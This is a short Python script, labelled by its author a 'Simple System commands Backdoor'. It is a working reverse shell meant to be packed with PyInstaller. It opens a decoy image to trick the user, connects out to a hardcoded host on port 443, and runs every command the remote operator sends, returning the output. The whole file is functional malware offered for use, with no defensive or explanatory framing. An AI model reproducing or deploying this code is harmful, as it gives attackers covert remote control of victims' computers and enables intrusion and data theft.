#!/usr/bin/python    
#__Author__ == 'Ananth Venkateswarlu aka she11z'
# Simple System commands Backdoor

import os
import sys
import socket
import subprocess

HOST = '192.168.0.101'
PORT = 443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
command_1 = sys._MEIPASS + "\\image.jpg"   # change the name image.jpg as per your file in pyinstaller.
subprocess.Popen(command_1, shell=True)    # Opens image.jpg in background to trick User.
DEVNULL = open(os.devnull, 'wb')

def execute_command(cmd):
	return subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)

try:
	s.connect((HOST,PORT))	
	while True:
		try: 
			s.send('\nshe11z # ')
			command = s.recv(1024)
			if command.strip() == 'quit':
				break
			else:	
				command_result = execute_command(command.strip())
				s.send(command_result)

		except Exception as e:
			s.send('\nCommand not found\n\n')

	s.close()

except Exception as e:
	pass
